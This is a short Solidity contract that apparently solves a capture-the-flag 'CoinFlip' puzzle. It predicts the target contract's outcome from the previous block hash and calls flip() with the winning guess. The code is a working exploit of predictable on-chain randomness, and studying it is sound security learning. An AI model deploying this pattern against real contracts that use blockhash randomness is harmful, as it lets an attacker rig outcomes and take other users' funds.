// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract ContractToFlip {
    ICoinFlip public coinFlipContract;
    
    uint256 public consecutiveWins;
    uint256 lastHash;

    constructor(address _coinFlipAddress) {
        coinFlipContract = ICoinFlip(_coinFlipAddress);
    }

    function callFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        bool result;

        if(side == true){
            result = coinFlipContract.flip(true);
        }
        else{
            result = coinFlipContract.flip(false);
        }
        
        if (result) {
            consecutiveWins++;
        }
        
    }

    function getConsecutiveWins() public view returns (uint256) {
        return coinFlipContract.consecutiveWins();
    }
}